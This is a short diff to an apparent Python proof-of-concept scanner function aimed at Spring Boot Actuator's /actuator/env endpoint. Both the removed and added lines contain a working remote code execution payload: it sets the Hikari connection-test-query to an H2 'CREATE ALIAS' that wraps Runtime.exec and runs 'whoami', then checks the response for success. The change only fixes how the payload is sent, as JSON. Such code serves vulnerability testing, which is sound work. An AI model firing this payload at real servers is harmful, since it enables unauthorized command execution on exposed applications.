@@ -40,12 +40,12 @@ def poc(url):
 
         path = """/actuator/env"""
         method = "POST"
-        data = """{
-  "name":"spring.datasource.hikari.connection-test-query",
-  "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
-}"""
+        data = {
+            "name":"spring.datasource.hikari.connection-test-query",
+            "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
+        }
         headers = {'Content-Type': 'application/json'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if (resp0.status_code == 200) and ("""spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT""" in resp0.text):
             result["success"] = True
